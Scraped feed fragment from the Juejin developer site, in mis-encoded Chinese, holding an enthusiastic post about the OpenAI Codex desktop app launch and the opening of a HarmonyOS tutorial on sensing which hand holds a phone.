<link>https://juejin.cn/post/7602463463105511470</link>    <guid>https://juejin.cn/post/7602463463105511470</guid>    <pubDate>2026-02-03T12:29:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602463463105511470" data-draft-id="7602465642533388338" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å…¨å‘˜å…è´¹ï¼ŒOpenAI æ ¼å±€æ‹‰æ»¡ï¼šCodex æ¡Œé¢ç‰ˆåˆšåˆšä¸Šçº¿ï¼"/> <meta itemprop="keywords" content="OpenAI"/> <meta itemprop="datePublished" content="2026-02-03T12:29:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çˆ±åƒçš„å°è‚¥ç¾Š"/> <meta itemprop="url" content="https://juejin.cn/user/2637045249608064"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å…¨å‘˜å…è´¹ï¼ŒOpenAI æ ¼å±€æ‹‰æ»¡ï¼šCodex æ¡Œé¢ç‰ˆåˆšåˆšä¸Šçº¿ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2637045249608064/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çˆ±åƒçš„å°è‚¥ç¾Š
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T12:29:33.000Z" title="Tue Feb 03 2026 12:29:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>é¢å¯¹è°·æ­Œã€Anthropicç‹‚è½°ä¹±ç‚¸ï¼ŒOpenAIç»ˆäºæ†‹ä¸ä½äº† å°±åœ¨ä»Šå¤©å‡Œæ™¨ï¼ŒOpenAI ç´§æ€¥æ¨å‡ºCodex æ¡Œé¢ç‰ˆ ï¼</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f2759e06429a45a59d46460c2f73d578~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770726574&amp;x-signature=Z5Ygl0ueRayVXvx1YeLKgShYsxY%3D" alt="" loading="lazy"/></p>
<p>è¿™å¯ä»¥è¯´æ˜¯å¥¥ç‰¹æ›¼çš„å¸Œæœ›æ‰€åœ¨ï¼Œä¹Ÿæ˜¯è¿å¿™è¯´çˆ±äº†çˆ±äº†ï¼</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68a6c142d04646f69161faffd5865e49~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770726574&amp;x-signature=AxiqmNmKOXY%2BnlzHX10ZdfLrnHY%3D" alt="" loading="lazy"/></p>
<p>å®˜æ–¹çš„ç»™Codex æ¡Œé¢ç‰ˆçš„å®šä½éå¸¸æ¸…æ™°ï¼š <strong>â€œAI ç¼–ç¨‹çš„æŒ‡æŒ¥ä¸­å¿ƒâ€</strong> ã€‚</p>
<p>ç®€å•æ¥è¯´ï¼Œä»¥å‰æˆ‘ä»¬æ˜¯ç”¨ AI å†™ä»£ç ï¼Œç°åœ¨æ˜¯è®© AI å¸®æˆ‘ä»¬æ‰“å·¥ï¼ˆAgentï¼‰ã€‚ä½ ä¸å†æ˜¯è‹¦å“ˆå“ˆæ•²ä»£ç çš„ç å†œï¼Œè€Œæ˜¯æŒ‡æŒ¥ä¸åŒAgentçš„â€œå¸ä»¤å®˜â€ã€‚</p>
<p>OpenAI è¿™æ³¢æ˜¾ç„¶æ˜¯æ€¥äº†ï¼Œç›´æ¥æŠŠå‹ç®±åº•çš„ç»æ´»éƒ½æ‹¿äº†å‡ºæ¥ã€‚æ•ˆæœåˆ°åº•æœ‰å¤šå¼ºï¼Ÿç»™å¤§å®¶æ‹†è§£å‡ ä¸ªæ ¸å¿ƒäº®ç‚¹å°±æ¸…æ¥šäº†ã€‚</p>
<p>ä»¥å‰æˆ‘ä»¬ç”¨ Cursor æˆ–è€…æ˜¯ç½‘é¡µç‰ˆ ChatGPTï¼Œåªèƒ½æ˜¯ï¼šä½ å†™ä¸€è¡Œï¼Œå®ƒè¡¥ä¸€è¡Œï¼›æˆ–è€…ä½ é—®ä¸€å¥ï¼Œå®ƒç­”ä¸€å¥ã€‚</p>
<p>ä½† Codex æ¡Œé¢ç‰ˆå®Œå…¨å˜äº†ã€‚å®ƒå¼•å…¥äº†ä¸€ä¸ªå«â€œå·¥ä½œæ ‘â€ï¼ˆWorktreesï¼‰çš„æ¦‚å¿µã€‚</p>
<p>ä½ å¯ä»¥åœ¨å·¦ä¾§å¼€å¯å¤šä¸ªçº¿ç¨‹ï¼ŒæŒ‡æ´¾ä¸åŒçš„ Agent å»å¹²æ´»ã€‚æ¯”å¦‚ï¼š</p>
<ul>
<li>
<p><strong>Agent Aï¼š</strong> å»å¸®æˆ‘é‡æ„ä¸€ä¸‹æ•°æ®åº“æ¥å£ï¼›</p>
</li>
<li>
<p><strong>Agent Bï¼š</strong> ç»™æ–°åŠŸèƒ½å†™å•å…ƒæµ‹è¯•ï¼›</p>
</li>
<li>
<p><strong>Agent Cï¼š</strong> å¸®æˆ‘ä¿®ä¸€ä¸‹æ˜¨æ™šé‚£ä¸ªè¯¥æ­»çš„ Bugã€‚</p>
</li>
</ul>
<p><img src="" alt="" loading="lazy"/></p>
<p>å¹¶ä¸”è¿™äº› Agent å…¨éƒ¨åœ¨åå°çš„ç‹¬ç«‹ç¯å¢ƒé‡Œè¿è¡Œï¼Œå®Œå…¨ä¸ä¼šå¹²æ‰°ä½ å½“å‰çš„å·¥ä½œã€‚</p>
<p>OpenAI ä¸ºäº†å±•ç¤º Codex çš„â€œSkillsï¼ˆæŠ€èƒ½ï¼‰â€èƒ½åŠ›ï¼Œç›´æ¥æ¼”ç¤ºäº†ä¸€ä¸ªç²¾å½©çš„æ¡ˆä¾‹ï¼š<strong>ç”¨ä¸€å¥è¯ï¼Œå¾’æ‰‹æ“å‡ºä¸€ä¸ª 3D èµ›è½¦æ¸¸æˆï¼</strong></p>
<p><img src="" alt="" loading="lazy"/></p>
<p>æ³¨æ„ï¼Œè¿™å¯ä¸æ˜¯ç®€å•çš„è´ªåƒè›‡ï¼Œè€Œæ˜¯åŒ…å«ç‰©ç†å¼•æ“ã€é“å…·ç³»ç»Ÿã€AI å¯¹æ‰‹å’Œå¤šå¼ åœ°å›¾çš„å¤æ‚æ¸¸æˆã€‚</p>
<p>Codex åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œä¸€å£æ°”æ¶ˆè€—äº† <strong>700ä¸‡ Token</strong>ã€‚å®ƒä¸ä»…æ˜¯å†™ä»£ç ï¼Œè¿˜è‡ªå·±å½“ç­–åˆ’ã€è‡ªå·±å½“æµ‹è¯•ã€‚</p>
<p>é™¤äº†èƒ½å†™ä»£ç ï¼ŒCodex è¿™æ¬¡æ¨å‡ºçš„Automationsï¼ˆè‡ªåŠ¨åŒ–ï¼‰åŠŸèƒ½ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3eb09865f8d14c1da105ac5f3ac5ce32~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770726574&amp;x-signature=NMBRLP9DCo3JGRfugZfQnpQDuGc%3D" alt="" loading="lazy"/></p>
<p>ä½ å¯ä»¥è®¾ç½®å®šæ—¶ä»»åŠ¡ï¼Œè®© Codex åœ¨åå° 24 å°æ—¶ä¸ºä½ æ‰“å·¥ã€‚</p>
<p>æ¯”å¦‚ï¼šæ¯å¤©æ—©ä¸Š 9 ç‚¹ï¼Œè‡ªåŠ¨æ‰«æ GitHub çš„ Issueï¼Œè‡ªåŠ¨åˆ†ç±» Bugï¼Œè‡ªåŠ¨ç”Ÿæˆæ—¥æŠ¥ï¼Œç”šè‡³è‡ªåŠ¨æŠŠä¿®å¥½çš„ä»£ç éƒ¨ç½²åˆ°äº‘ç«¯ã€‚</p>
<p>OpenAI æ€»è£ Greg Brockman éƒ½å¿ä¸ä½åœ¨æ¨ç‰¹ä¸Šå–Šè¯ï¼šâ€œè‡ªä»ç”¨äº† Codexï¼Œå†å›åˆ°ç»ˆç«¯ç®€ç›´å°±åƒç©¿è¶Šå›äº†å¤ä»£ï¼â€</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9b7878502ce4438a5b80c075c283798~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770726574&amp;x-signature=pOo1hnTg1dJ9OdCM5t6ZsVN0A64%3D" alt="" loading="lazy"/></p>
<p>æœ€åè¯´ä¸€ä¸‹å¤§å®¶æœ€å…³å¿ƒçš„ï¼Œæ€ä¹ˆç”¨ï¼Ÿ</p>
<p>è¿™æ¬¡ OpenAI æ ¼å±€æ‰“å¼€äº†ã€‚<strong>macOS ç‰ˆæœ¬ç°å·²ä¸Šçº¿ï¼ˆWindows å³å°†æ¨å‡ºï¼‰ï¼Œè€Œä¸” ChatGPT å…è´¹ç”¨æˆ·å’Œ Go ç‰ˆæœ¬ç”¨æˆ·ä¹Ÿèƒ½é™æ—¶ä½“éªŒï¼</strong> ï¼ˆSam Altman é€éœ²è¯•ç”¨æœŸå°†é•¿è¾¾ä¸¤ä¸ªæœˆï¼‰</p>
<p>å¯¹äº Plusã€Pro è¿™äº›ä»˜è´¹ç”¨æˆ·ï¼Œæ›´å¯é™æ—¶äº«å— 2 å€ çš„ä½¿ç”¨é‡é¢åº¦ã€‚</p>
<p>å¦‚æœè¿˜ä¸ä¼šè®¢é˜…ChatGPT Plusï¼Œå¯ä»¥çœ‹æˆ‘ä¹‹å‰çš„æ–‡ç« ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c022728c82ff45948ed26b4f6267f4a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770726574&amp;x-signature=PZ8aa%2BHgC9zLqlkxVZhz2%2FfPKZY%3D" alt="" loading="lazy"/></p>
<p>çœ‹å®Œ Codex çš„å‘å¸ƒï¼Œæˆ‘æœ€å¤§çš„æ„Ÿå—æ˜¯ï¼š<strong>OpenAIç»ˆäºæ†‹ä¸ä½äº†ï¼</strong> è¿‡å»çš„ä¸€ä¸ªæœˆï¼Œå¯ä»¥è¯´æ˜¯OpenAIçš„è‡³æš—æ—¶åˆ»ï¼Œä¸ä»…æŠµæŒ¡ä¸ä½Gemini 3çš„å†²å‡»ï¼Œè€Œæœ€è¿‘åˆè¢«Claude codeå…¨é¢ç¢¾å‹ï¼ ç»ˆäºï¼ŒçŒ›è™å¼€å§‹å‘åŠ›äº†ï¼</p>
<p>ï¼ˆå†…å¿ƒOSï¼šæ‰“å¾—å†æ¿€çƒˆç‚¹ï½ï¼‰</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é¸¿è’™å¼€å‘å®æˆ˜ï¼šç©è½¬â€œæ™ºæ„Ÿæ¡å§¿â€â€”â€”æ–°é—»åˆ—è¡¨å·¦å³æ‰‹æ™ºèƒ½åˆ‡æ¢]]></title>    <link>https://juejin.cn/post/7602455806446993414</link>    <guid>https://juejin.cn/post/7602455806446993414</guid>    <pubDate>2026-02-04T02:00:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602455806446993414" data-draft-id="7602455806446977030" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é¸¿è’™å¼€å‘å®æˆ˜ï¼šç©è½¬â€œæ™ºæ„Ÿæ¡å§¿â€â€”â€”æ–°é—»åˆ—è¡¨å·¦å³æ‰‹æ™ºèƒ½åˆ‡æ¢"/> <meta itemprop="keywords" content="HarmonyOS,ArkUI,ArkTS"/> <meta itemprop="datePublished" content="2026-02-04T02:00:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¨å“¥çˆ±ç¼–ç¨‹"/> <meta itemprop="url" content="https://juejin.cn/user/2242659450109575"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é¸¿è’™å¼€å‘å®æˆ˜ï¼šç©è½¬â€œæ™ºæ„Ÿæ¡å§¿â€â€”â€”æ–°é—»åˆ—è¡¨å·¦å³æ‰‹æ™ºèƒ½åˆ‡æ¢
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2242659450109575/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¨å“¥çˆ±ç¼–ç¨‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T02:00:35.000Z" title="Wed Feb 04 2026 02:00:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯Vå“¥ã€‚</p>
<p>ä½ æœ‰æ²¡æœ‰é‡åˆ°è¿‡è¿™ç§æƒ…å†µï¼š</p>
<blockquote>
<p>å·¦æ‰‹æ‹¿ç€å¥¶èŒ¶ï¼Œå³æ‰‹åˆ·æ–°é—»ï¼Œç»“æœå¤´å›¾æ°¸è¿œåœ¨å³è¾¹ï¼Œç‚¹éƒ½ç‚¹ä¸åˆ°ï¼Ÿ</p>
</blockquote>
<p>ç°åœ¨å¥½äº†ï¼Œç³»ç»Ÿèƒ½å®æ—¶æ„ŸçŸ¥ä½ æ˜¯å·¦æ‰‹è¿˜æ˜¯å³æ‰‹æ¡æŒï¼ŒUI è‡ªåŠ¨é€‚é…ï¼è¿™æ‰æ˜¯çœŸæ­£çš„â€œæ‡‚ä½ â€ï¼</p>
<p>ä»Šå¤© V å“¥å°±ç”¨ä¸€ä¸ªæ–°é—»åˆ—è¡¨é¡µé¢ï¼Œå¸¦ä½  10 åˆ†é’Ÿæå®šæ™ºæ„Ÿæ¡å§¿çš„å®Œæ•´å¼€å‘ï¼èƒ½æ ¹æ®ä½ æ‹¿æ‰‹æœºçš„å§¿åŠ¿ï¼Œè‡ªåŠ¨æŠŠå›¾ç‰‡å’Œæ–‡å­—äº’æ¢ä½ç½®ã€‚ä»£ç å…¨åœ¨ä¸€ä¸ªé¡µé¢ï¼Œå¤åˆ¶è¿›å»å°±èƒ½è·‘ï¼Œç»å¯¹ç¡¬æ ¸ï¼</p>
<h2 data-id="heading-0">æŠ€æœ¯åŸç†ï¼šæ‰‹æœºæ€ä¹ˆçŸ¥é“é‚£æ˜¯ä½ çš„å·¦æ‰‹ï¼Ÿ</h2>
<p>å…¶å®å¾ˆç®€å•ã€‚ä½ æƒ³æƒ³ï¼Œå½“ä½ ç”¨<strong>å³æ‰‹</strong>å•æ‰‹æ¡æŒæ‰‹æœºæ—¶ï¼Œä¸ºäº†è®©å¤§æ‹‡æŒ‡å¤Ÿåˆ°å±å¹•å·¦ä¾§ï¼Œæ‰‹æœºé€šå¸¸ä¼šä¸ç”±è‡ªä¸»åœ°å‘<strong>å·¦å€¾æ–œ</strong>ä¸€ç‚¹ç‚¹ï¼ˆæˆ–è€…å‘å³å€¾æ–œï¼Œçœ‹ä¸ªäººä¹ æƒ¯ï¼Œé€šå¸¸æˆ‘ä»¬è®¾å®šä¸€ä¸ªå€¾æ–œé˜ˆå€¼ï¼‰ã€‚</p>
<p>å’±ä»¬åˆ©ç”¨é¸¿è’™çš„ <code>@ohos.sensor</code>ï¼ˆä¼ æ„Ÿå™¨èƒ½åŠ›ï¼‰ï¼Œç›‘å¬é‡åŠ›å˜åŒ–ã€‚</p>
<ul>
<li>å½“æ£€æµ‹åˆ°æ‰‹æœºå‘å·¦å€¾æ–œï¼ˆXè½´é‡åŠ›åˆ†é‡å˜åŒ–ï¼‰ï¼Œåˆ¤å®šä¸ºå·¦æ‰‹æˆ–å·¦ä¾§æ¨¡å¼ã€‚</li>
<li>å½“æ£€æµ‹åˆ°æ‰‹æœºå‘å³å€¾æ–œï¼Œåˆ¤å®šä¸ºå³æ‰‹æˆ–å³ä¾§æ¨¡å¼ã€‚</li>
</ul>
<p>è¯ä¸å¤šè¯´ï¼Œç›´æ¥ä¸Šå¹²è´§ã€‚</p>
<h2 data-id="heading-1">å®æˆ˜ä»£ç ï¼šæ™ºæ„Ÿæ¡å§¿æ–°é—»åˆ—è¡¨</h2>
<p>å…ˆçœ‹ä¸€ä¸‹ V å“¥å†™çš„æ¡ˆä¾‹æˆªå›¾ï¼š</p>
<p>å·¦æ‰‹æ¨¡å¼ï¼š
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b42835686180458ca633de69f422302a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aiB5ZOl54ix57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770775235&amp;x-signature=RB6sXkH4TZrwj%2Fb4HNrZXo9ZmmY%3D" alt="" loading="lazy"/></p>
<p>å³æ‰‹æ¨¡å¼ï¼š</p>
